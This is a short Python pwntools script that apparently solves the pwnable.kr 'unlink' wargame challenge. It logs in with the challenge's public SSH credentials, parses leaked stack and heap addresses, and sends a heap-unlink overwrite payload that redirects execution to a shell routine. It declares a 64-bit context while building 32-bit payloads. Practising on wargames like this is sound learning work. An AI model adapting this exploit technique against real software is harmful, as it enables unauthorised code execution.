from pwn import *
from pwnlib.util.packing import p32
#context(log_level="debug")
context.update(arch="amd64", os="linux", bits=64)
s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
# p = s.connect_remote('localhost', 9032)
p = s.process("./unlink")

p.recvuntil("stack address leak: ")
stack = int(p.recv(10),16)
print(stack)
p.recvuntil("here is heap address leak: ")
heap = int(p.recv(9),16)
print(heap)

p.recvuntil("now that you have leaks, get shell!\n")

target = stack + 0x10
shell = 0x80484eb
controlled_buf = heap + 8
pad = b"A" * 12

payload = p32(shell) + pad + p32(controlled_buf+4) + p32(target)
# p.sendline(pack('<I', shell) + "A" * 12 + pack('<I', controlled_buf + 4) + pack('<I', target))
p.sendline(payload)
p.interactive()
p.close()
